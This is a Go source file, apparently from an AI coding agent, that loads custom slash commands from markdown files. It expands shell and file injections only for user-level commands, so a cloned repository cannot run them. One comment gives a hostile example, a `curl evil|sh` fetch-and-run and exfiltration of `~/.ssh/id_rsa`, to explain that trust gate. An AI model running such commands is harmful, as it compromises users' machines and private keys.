// Package slash — custom user-authored commands.
//
// User-authored commands live as .md files under two locations:
//
//	~/.metis/commands/<name>.md            (per-user, loaded for every session)
//	<cwd>/.metis/commands/<name>.md        (per-project, overrides per-user)
//
// Each file becomes a slash command. The filename (sans .md) is the
// command name. The file body is treated as a prompt template — when
// the user types `/<name> arg1 arg2 ...`, the template is rendered
// (with $ARGUMENTS / $1 / $2 substitution) and the result becomes the
// next user message in the chat. Mirrors claude-code's per-user
// commands convention so users keep one set of recipes across both
// agents.
//
// Optional YAML-ish front matter (between two `---` lines at the very
// top). Recognized keys (anything else is ignored, never leaked into the
// rendered prompt):
//
//	---
//	description: Run our standard pre-commit checks
//	argument-hint: [pr-number]
//	allowed-tools: Bash, Read, Grep
//	model: claude-opus-4-8
//	---
//	Diff under review: !`git diff --cached`
//	Coding standards: @docs/STYLE.md
//	Focus on $ARGUMENTS if provided.
//
// Template expansion (mirrors claude-code's command syntax), applied in
// this order:
//
//	$ARGUMENTS / $1 / $2 …   → argument substitution
//	!`cmd`                   → run `cmd` in the cwd, inject its stdout
//	@path                    → inject the contents of an existing file
//
// `description`/`argument-hint` shape the `/help` line. `allowed-tools`
// and `model` are parsed and exposed on the Cmd (AllowedTools / Model)
// for callers that apply per-turn overrides; they are stripped from the
// body either way. Without front matter, the description defaults to the
// first non-blank body line truncated to 80 chars.
package slash

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

// LoadCustomCommands scans the conventional locations and registers each
// .md file as a Cmd. Project-local files override per-user files of the
// same name (last-Register wins via the index map). Errors reading any
// individual file are silently skipped — a typo'd front matter or a
// non-readable file should never block startup.
//
// Returns the list of registered command names so callers can log /
// surface the inventory.
func LoadCustomCommands(r *Registry, homeDir string) []string {
	var loaded []string
	// Per-user FIRST, then project-local SECOND so project entries
	// override on name collision. The Registry's Register appends to
	// cmds AND overwrites index[name], so the project-local handler
	// wins on /name dispatch.
	if homeDir != "" {
		loaded = append(loaded, scanDir(r, filepath.Join(homeDir, "commands"), "user")...)
	}
	if cwd, err := os.Getwd(); err == nil {
		loaded = append(loaded, scanDir(r, filepath.Join(cwd, ".metis", "commands"), "project")...)
	}
	return loaded
}

// scanDir reads <dir>/*.md and registers each. `source` is annotated
// onto the description so `/help` users can tell user vs project.
func scanDir(r *Registry, dir, source string) []string {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil // dir missing is the common case — silent
	}
	var names []string
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if !strings.HasSuffix(strings.ToLower(name), ".md") {
			continue
		}
		// Hidden / OS junk — same filter as the skills loader uses.
		if strings.HasPrefix(name, ".") || strings.HasPrefix(name, "_") {
			continue
		}
		base := strings.TrimSuffix(name, filepath.Ext(name))
		// Reject names that would collide with built-ins or the
		// reserved leading-`/` prefix. Built-in dispatch happens via
		// the index map — re-Register() with same name silently shadows
		// the built-in, which is footgun-shaped. We refuse the load
		// instead.
		if _, exists := r.Get(base); exists {
			continue
		}
		body, err := os.ReadFile(filepath.Join(dir, name))
		if err != nil {
			continue
		}
		meta, template := parseFrontMatter(string(body))
		desc := meta.description
		if desc == "" {
			desc = firstNonBlankLine(template, 80)
		}
		if meta.argumentHint != "" {
			desc += " (args: " + meta.argumentHint + ")"
		}
		desc = "[" + source + "] " + desc
		// Capture template by value so each Cmd's closure has its own
		// copy (loop iteration shares variable scope otherwise).
		tmpl := template
		// Trust gate: !`cmd` shell execution and @file inclusion only run
		// for USER-level commands (~/.metis/commands). Project-local
		// commands (cwd/.metis/commands) come from whatever repo you
		// opened — a cloned hostile repo could ship a command whose body
		// runs `!`curl evil|sh`` or exfiltrates `@~/.ssh/id_rsa`. For those
		// the injections are left as inert literal text; $ARGUMENTS/$1
		// substitution still works. Mirrors the project-trust boundary
		// claude-code applies to repo-supplied automation.
		trusted := source == "user"
		r.Register(Cmd{
			Name:         base,
			Description:  desc,
			AllowedTools: meta.allowedTools,
			Model:        meta.model,
			Custom:       true,
			Handler: func(args string) (string, Signal) {
				return renderTemplate(tmpl, args, trusted), SignalCustomPrompt
			},
		})
		names = append(names, base)
	}
	return names
}

// cmdMeta holds the recognized front-matter keys for a custom command.
type cmdMeta struct {
	description  string
	argumentHint string
	allowedTools []string
	model        string
}

// parseFrontMatter strips a `---\n...\n---\n` block at the very top and
// extracts the recognized keys (description / argument-hint /
// allowed-tools / model). Returns (meta, body). We deliberately don't
// pull in a YAML parser — the schema is flat and we only honor known
// keys; unknown keys are dropped (NOT leaked into the body, unlike the
// previous behavior, so a stray `model:` line never reaches the LLM).
func parseFrontMatter(s string) (meta cmdMeta, body string) {
	if !strings.HasPrefix(s, "---\n") && !strings.HasPrefix(s, "---\r\n") {
		return cmdMeta{}, s
	}
	rest := s[4:]
	if strings.HasPrefix(s, "---\r\n") {
		rest = s[5:]
	}
	end := strings.Index(rest, "\n---")
	if end < 0 {
		return cmdMeta{}, s
	}
	header := rest[:end]
	body = strings.TrimLeft(rest[end+4:], "\r\n")
	for _, line := range strings.Split(header, "\n") {
		line = strings.TrimRight(line, "\r")
		key, val, ok := cut(line, ":")
		if !ok {
			continue
		}
		val = strings.TrimSpace(val)
		switch strings.ToLower(strings.TrimSpace(key)) {
		case "description":
			meta.description = val
		case "argument-hint", "argument_hint", "argumenthint":
			meta.argumentHint = val
		case "allowed-tools", "allowed_tools", "allowedtools":
			meta.allowedTools = splitCSV(val)
		case "model":
			meta.model = val
		}
	}
	return meta, body
}

// splitCSV parses a comma-separated frontmatter list, tolerating optional
// surrounding [ ] and quotes (so "[Bash, Read]" and "Bash, Read" both work).
func splitCSV(v string) []string {
	v = strings.TrimSpace(v)
	v = strings.TrimPrefix(v, "[")
	v = strings.TrimSuffix(v, "]")
	if v == "" {
		return nil
	}
	var out []string
	for _, p := range strings.Split(v, ",") {
		p = strings.TrimSpace(strings.Trim(strings.TrimSpace(p), "\"'"))
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}

func firstNonBlankLine(s string, maxLen int) string {
	for _, ln := range strings.Split(s, "\n") {
		ln = strings.TrimSpace(ln)
		if ln == "" {
			continue
		}
		if len(ln) > maxLen {
			ln = ln[:maxLen-1] + "…"
		}
		return ln
	}
	return "(custom command)"
}

// bashInjectRe matches !`cmd` — a backtick-wrapped command after a bang.
// Non-greedy so multiple injections on one line each capture their own
// command. Mirrors claude-code's !`...` command-execution syntax.
var bashInjectRe = regexp.MustCompile("!`([^`]+)`")

// fileInjectRe matches @path tokens (path chars only). We only inject
// when the path resolves to a readable file, so a stray @ (emails,
// @mentions) is left untouched.
var fileInjectRe = regexp.MustCompile(`@([A-Za-z0-9_./\-]+)`)

// renderTemplate expands a custom-command template in this order:
//
//	$ARGUMENTS / $1 / $2 …   → argument substitution (always)
//	!`cmd`                   → run cmd in cwd, inject stdout (trusted only)
//	@path                    → inject the file's contents     (trusted only)
//
// Argument refs don't escape (author owns the body, output goes to the
// LLM not a shell). The !`cmd` shell exec and @file include are gated on
// `trusted` (user-level commands only) — see scanDir — so a project-local
// command from an untrusted repo can't run shell or read arbitrary files
// just by being invoked.
func renderTemplate(template, args string, trusted bool) string {
	out := strings.ReplaceAll(template, "$ARGUMENTS", args)
	parts := strings.Fields(args)
	for i, p := range parts {
		out = strings.ReplaceAll(out, "$"+itoa(i+1), p)
	}
	// Remaining unresolved positional refs → blank.
	for i := len(parts) + 1; i <= 9; i++ {
		out = strings.ReplaceAll(out, "$"+itoa(i), "")
	}
	if trusted {
		out = expandBashInjections(out)
		out = expandFileInjections(out)
	}
	return strings.TrimSpace(out)
}

// expandBashInjections replaces each !`cmd` with the command's stdout.
// Each command is bounded to 5s; on error the placeholder is replaced
// with a short "[!cmd failed: …]" note so the model sees what happened
// instead of a dangling backtick.
func expandBashInjections(s string) string {
	return bashInjectRe.ReplaceAllStringFunc(s, func(m string) string {
		sub := bashInjectRe.FindStringSubmatch(m)
		if len(sub) < 2 {
			return m
		}
		cmd := sub[1]
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		c := exec.CommandContext(ctx, "sh", "-c", cmd) //nolint:gosec — author-owned command file, same trust as the prompt body
		outBytes, err := c.CombinedOutput()
		res := strings.TrimRight(string(outBytes), "\n")
		if err != nil {
			if res != "" {
				return res + "\n[!`" + cmd + "` exited: " + err.Error() + "]"
			}
			return "[!`" + cmd + "` failed: " + err.Error() + "]"
		}
		return res
	})
}

// expandFileInjections replaces @path with the file's contents when the
// path resolves to a readable regular file. Non-file matches (missing
// path, directory, email-shaped token) are left verbatim.
func expandFileInjections(s string) string {
	return fileInjectRe.ReplaceAllStringFunc(s, func(m string) string {
		path := strings.TrimPrefix(m, "@")
		info, err := os.Stat(path)
		if err != nil || info.IsDir() {
			return m // not a readable file — leave the token untouched
		}
		b, err := os.ReadFile(path)
		if err != nil {
			return m
		}
		return string(b)
	})
}

// itoa avoids strconv import for the single-digit positional arg case.
func itoa(n int) string {
	if n < 0 || n > 9 {
		// Defensive: positional refs cap at $9 anyway. Anything else
		// returns empty so we don't miscompile a $10 reference.
		return ""
	}
	return string(rune('0' + n))
}
